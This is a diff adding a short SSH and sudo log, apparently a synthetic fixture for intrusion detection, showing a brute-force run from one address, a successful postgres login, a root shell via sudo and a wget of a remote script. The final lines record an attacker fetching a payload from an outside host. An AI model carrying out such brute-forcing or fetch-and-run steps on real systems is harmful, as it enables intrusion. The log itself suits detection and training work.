@@ -1,0 +1,17 @@
+Aug 24 03:02:00 webserver sshd[2119]: Accepted password for backup from 10.0.4.15 port 55626 ssh2
+Aug 24 04:11:00 webserver sshd[7362]: Failed password for invalid user root from 203.0.113.44 port 61262 ssh2
+Aug 24 04:11:04 webserver sshd[2332]: Failed password for invalid user root from 203.0.113.44 port 39379 ssh2
+Aug 24 04:11:08 webserver sshd[9022]: Failed password for invalid user root from 203.0.113.44 port 46277 ssh2
+Aug 24 04:11:12 webserver sshd[9012]: Failed password for invalid user oracle from 203.0.113.44 port 46572 ssh2
+Aug 24 04:11:14 webserver sshd[7166]: Failed password for invalid user oracle from 203.0.113.44 port 48297 ssh2
+Aug 24 04:11:18 webserver sshd[3466]: Failed password for invalid user oracle from 203.0.113.44 port 58416 ssh2
+Aug 24 04:11:27 webserver sshd[7975]: Failed password for invalid user admin from 203.0.113.44 port 60661 ssh2
+Aug 24 04:11:36 webserver sshd[3587]: Failed password for invalid user admin from 203.0.113.44 port 33955 ssh2
+Aug 24 04:11:38 webserver sshd[9205]: Failed password for invalid user admin from 203.0.113.44 port 42512 ssh2
+Aug 24 04:11:44 webserver sshd[3102]: Failed password for postgres from 203.0.113.44 port 45698 ssh2
+Aug 24 04:11:46 webserver sshd[5100]: Failed password for postgres from 203.0.113.44 port 56585 ssh2
+Aug 24 04:11:52 webserver sshd[5998]: Failed password for postgres from 203.0.113.44 port 31145 ssh2
+Aug 24 04:12:00 webserver sshd[5601]: Accepted password for postgres from 203.0.113.44 port 47953 ssh2
+Aug 24 04:12:02 webserver sshd[2264]: pam_unix(sshd:session): session opened for user postgres by (uid=0)
+Aug 24 04:12:31 webserver sudo:  postgres : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Aug 24 04:12:44 webserver sudo:  postgres : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.9/x.sh
